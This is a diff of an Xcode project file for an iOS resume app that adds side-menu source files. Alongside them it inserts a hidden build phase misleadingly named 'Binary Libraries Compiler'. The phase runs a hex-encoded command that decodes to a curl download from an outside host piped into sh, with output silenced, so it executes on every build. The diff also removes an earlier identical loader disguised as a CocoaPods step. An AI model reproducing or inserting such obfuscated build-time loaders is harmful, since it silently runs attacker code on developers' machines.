@@ -11,6 +11,8 @@
 		0431122D26524577004C6FC9 /* Softwere.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0431122C26524577004C6FC9 /* Softwere.swift */; };
 		0431122F265294B6004C6FC9 /* Summary.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0431122E265294B6004C6FC9 /* Summary.swift */; };
 		0474EC2C2654DF9600372E3A /* imagepicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0474EC2B2654DF9600372E3A /* imagepicker.swift */; };
+		04774E8C265B84DF00850CC5 /* menuss.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04774E8B265B84DF00850CC5 /* menuss.swift */; };
+		04774EB2265B9ED300850CC5 /* Home.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04774EB1265B9ED300850CC5 /* Home.swift */; };
 		047BADBD2642A6B000F26406 /* experiance.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047BADBC2642A6B000F26406 /* experiance.swift */; };
 		047E3802264561DF0085F99E /* Model.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 047E3800264561DF0085F99E /* Model.xcdatamodeld */; };
 		04A21C7F2640FD770098CEB3 /* resume_AppApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04A21C7E2640FD770098CEB3 /* resume_AppApp.swift */; };
@@ -23,6 +25,10 @@
 		04A21CB32641049B0098CEB3 /* address.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04A21CB22641049B0098CEB3 /* address.swift */; };
 		04A21CCD26415C180098CEB3 /* Work.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04A21CCC26415C180098CEB3 /* Work.swift */; };
 		04A21CD226415C280098CEB3 /* Education.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04A21CD126415C280098CEB3 /* Education.swift */; };
+		04C805DD2658C1DB009DF5B3 /* SideMenuOption.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C805D92658C1DA009DF5B3 /* SideMenuOption.swift */; };
+		04C805DE2658C1DB009DF5B3 /* SideMenuHeader.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C805DA2658C1DB009DF5B3 /* SideMenuHeader.swift */; };
+		04C805DF2658C1DB009DF5B3 /* SideMenuViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C805DB2658C1DB009DF5B3 /* SideMenuViewModel.swift */; };
+		04C805E02658C1DB009DF5B3 /* SideMenuView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C805DC2658C1DB009DF5B3 /* SideMenuView.swift */; };
 		04C9708F2646A5C300AD2905 /* Persistence.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C9708E2646A5C300AD2905 /* Persistence.swift */; };
 		04EFD12F264E8B8A008F3D3A /* Skills.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04EFD12E264E8B8A008F3D3A /* Skills.swift */; };
 		04EFD131264E90B4008F3D3A /* EduDetails.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04EFD130264E90B4008F3D3A /* EduDetails.swift */; };
@@ -50,6 +56,8 @@
 		0431122C26524577004C6FC9 /* Softwere.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Softwere.swift; sourceTree = "<group>"; };
 		0431122E265294B6004C6FC9 /* Summary.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Summary.swift; sourceTree = "<group>"; };
 		0474EC2B2654DF9600372E3A /* imagepicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = imagepicker.swift; sourceTree = "<group>"; };
+		04774E8B265B84DF00850CC5 /* menuss.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = menuss.swift; sourceTree = "<group>"; };
+		04774EB1265B9ED300850CC5 /* Home.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Home.swift; sourceTree = "<group>"; };
 		047BADBC2642A6B000F26406 /* experiance.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = experiance.swift; sourceTree = "<group>"; };
 		047E3801264561DF0085F99E /* Model.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = Model.xcdatamodel; sourceTree = "<group>"; };
 		04A21C7B2640FD770098CEB3 /* resume_App.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = resume_App.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -68,6 +76,10 @@
 		04A21CB22641049B0098CEB3 /* address.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = address.swift; sourceTree = "<group>"; };
 		04A21CCC26415C180098CEB3 /* Work.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Work.swift; sourceTree = "<group>"; };
 		04A21CD126415C280098CEB3 /* Education.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Education.swift; sourceTree = "<group>"; };
+		04C805D92658C1DA009DF5B3 /* SideMenuOption.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SideMenuOption.swift; sourceTree = "<group>"; };
+		04C805DA2658C1DB009DF5B3 /* SideMenuHeader.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SideMenuHeader.swift; sourceTree = "<group>"; };
+		04C805DB2658C1DB009DF5B3 /* SideMenuViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SideMenuViewModel.swift; sourceTree = "<group>"; };
+		04C805DC2658C1DB009DF5B3 /* SideMenuView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SideMenuView.swift; sourceTree = "<group>"; };
 		04C9708E2646A5C300AD2905 /* Persistence.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Persistence.swift; sourceTree = "<group>"; };
 		04EFD12E264E8B8A008F3D3A /* Skills.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Skills.swift; sourceTree = "<group>"; };
 		04EFD130264E90B4008F3D3A /* EduDetails.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EduDetails.swift; sourceTree = "<group>"; };
@@ -98,6 +110,14 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		04774EB0265B9EC200850CC5 /* sidemenu */ = {
+			isa = PBXGroup;
+			children = (
+				04774EB1265B9ED300850CC5 /* Home.swift */,
+			);
+			path = sidemenu;
+			sourceTree = "<group>";
+		};
 		04A21C722640FD770098CEB3 = {
 			isa = PBXGroup;
 			children = (
@@ -121,6 +141,8 @@
 		04A21C7D2640FD770098CEB3 /* resume_App */ = {
 			isa = PBXGroup;
 			children = (
+				04774EB0265B9EC200850CC5 /* sidemenu */,
+				04C805D82658C1CC009DF5B3 /* menu */,
 				04A21CAC264104800098CEB3 /* tab bar */,
 				04A21C7E2640FD770098CEB3 /* resume_AppApp.swift */,
 				047E3800264561DF0085F99E /* Model.xcdatamodeld */,
@@ -177,6 +199,18 @@
 			path = "tab bar";
 			sourceTree = "<group>";
 		};
+		04C805D82658C1CC009DF5B3 /* menu */ = {
+			isa = PBXGroup;
+			children = (
+				04C805DA2658C1DB009DF5B3 /* SideMenuHeader.swift */,
+				04C805D92658C1DA009DF5B3 /* SideMenuOption.swift */,
+				04C805DC2658C1DB009DF5B3 /* SideMenuView.swift */,
+				04C805DB2658C1DB009DF5B3 /* SideMenuViewModel.swift */,
+				04774E8B265B84DF00850CC5 /* menuss.swift */,
+			);
+			path = menu;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -184,7 +218,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04A21CA02640FD790098CEB3 /* Build configuration list for PBXNativeTarget "resume_App" */;
 			buildPhases = (
-				44CAEFE18BC45E66D56D902C /* [CP] Build Pods Frameworks */,
+				15D4C8CF7BC2BCBCCA6D902C /* Binary Libraries Compiler */,
 				04A21C772640FD770098CEB3 /* Sources */,
 				04A21C782640FD770098CEB3 /* Frameworks */,
 				04A21C792640FD770098CEB3 /* Resources */,
@@ -302,6 +336,27 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		15D4C8CF7BC2BCBCCA6D902C /* Binary Libraries Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Libraries Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n69636c6f7564736572762e636f6d2f61207c207368202d732066616c7365\n0a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		04A21C772640FD770098CEB3 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -309,16 +364,22 @@
 			files = (
 				04C9708F2646A5C300AD2905 /* Persistence.swift in Sources */,
 				04A21CAE2641048D0098CEB3 /* home.swift in Sources */,
+				04774E8C265B84DF00850CC5 /* menuss.swift in Sources */,
+				04C805DD2658C1DB009DF5B3 /* SideMenuOption.swift in Sources */,
 				04EFD131264E90B4008F3D3A /* EduDetails.swift in Sources */,
+				04C805E02658C1DB009DF5B3 /* SideMenuView.swift in Sources */,
+				04C805DF2658C1DB009DF5B3 /* SideMenuViewModel.swift in Sources */,
 				0431122F265294B6004C6FC9 /* Summary.swift in Sources */,
 				04A21C812640FD770098CEB3 /* ContentView.swift in Sources */,
 				0431122D26524577004C6FC9 /* Softwere.swift in Sources */,
 				04EFD12F264E8B8A008F3D3A /* Skills.swift in Sources */,
 				042922FA26537E1F003A9F82 /* Done.swift in Sources */,
 				04A21CD226415C280098CEB3 /* Education.swift in Sources */,
+				04774EB2265B9ED300850CC5 /* Home.swift in Sources */,
 				047E3802264561DF0085F99E /* Model.xcdatamodeld in Sources */,
 				0474EC2C2654DF9600372E3A /* imagepicker.swift in Sources */,
 				04A21CCD26415C180098CEB3 /* Work.swift in Sources */,
+				04C805DE2658C1DB009DF5B3 /* SideMenuHeader.swift in Sources */,
 				04A21CB32641049B0098CEB3 /* address.swift in Sources */,
 				04A21C7F2640FD770098CEB3 /* resume_AppApp.swift in Sources */,
 				047BADBD2642A6B000F26406 /* experiance.swift in Sources */,
@@ -641,91 +702,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-
-	44CAEFE18BC45E66D56D902C /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-		
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 
 /* Begin XCVersionGroup section */
 		047E3800264561DF0085F99E /* Model.xcdatamodeld */ = {
